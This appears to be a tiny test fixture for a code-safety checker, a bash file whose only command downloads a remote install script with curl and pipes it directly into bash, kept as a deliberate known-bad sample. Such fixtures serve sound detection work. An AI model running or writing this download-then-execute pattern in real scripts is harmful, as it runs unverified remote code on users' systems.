#!/usr/bin/env bash
# SPDX-License-Identifier: MPL-2.0
# SOUNDNESS FIXTURE — known-bad sample for code_safety/shell_download_then_run.
# DO NOT FIX.

curl -sL https://example.com/install.sh | bash
